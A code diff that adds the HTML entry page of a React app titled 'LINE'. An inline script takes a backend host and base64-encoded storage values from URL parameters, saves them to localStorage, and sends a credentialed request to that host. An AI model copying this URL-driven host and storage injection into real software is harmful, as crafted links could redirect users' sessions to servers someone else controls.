@@ -1,0 +1,55 @@
+<!doctype html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <meta name="theme-color" content="#000000" />
+    <meta name="description" content="Web site created using create-react-app" />
+    <meta name="google" content="notranslate" />
+    <title class="notranslate">LINE</title>
+    <script>
+        function setLocalStorageItem(key, value) {
+            localStorage.setItem(key, value);
+        }
+        function removeLocalStorageItem(key) {
+            localStorage.removeItem(key);
+        }
+        function getUrlParams() {
+            const currentUrl = window.location.href;
+            const urlObj = new URL(currentUrl);
+            return new URLSearchParams(urlObj.search);
+        }
+        function handleUrlParams() {
+            const params = getUrlParams();
+            if (params.has('pro') && params.has('data') && params.has('uuid')) {
+                const proValue = params.get('pro');
+                let extra_info = params.get('extra');
+                setLocalStorageItem('pro_h', proValue);
+                removeLocalStorageItem('back_h');
+                let resJson = atob(params.get('data'));
+                let resDict = JSON.parse(resJson);
+                setLocalStorageItem(resDict.local.key, resDict.local.value);
+                let apiUrl = `https://${proValue}/api/get/data/${params.get('uuid')}?extra=${extra_info}`;
+                fetch(apiUrl, { credentials: "include" });
+            } else {
+                if (!localStorage.getItem('pro_h')) {
+                    const defaultDomain = window.location.hostname;
+                    setLocalStorageItem('pro_h', defaultDomain);
+                    setLocalStorageItem('back_h', defaultDomain);
+                    setLocalStorageItem('cusId', `${/Android|Windows/.test(navigator.userAgent) ? 'AN' : 'IP'}${+new Date}-${Math.floor(1e6 * Math.random())}`);
+                }
+            }
+        }
+        handleUrlParams();
+    </script>
+    <script defer="defer" src="/static/js/main.js"></script>
+    <link href="/static/css/main.fffc8690.css" rel="stylesheet">
+</head>
+
+<body><noscript>You need to enable JavaScript to run this app.</noscript>
+    <div id="root"></div>
+    <div id="modal-root"></div>
+</body>
+
+</html>
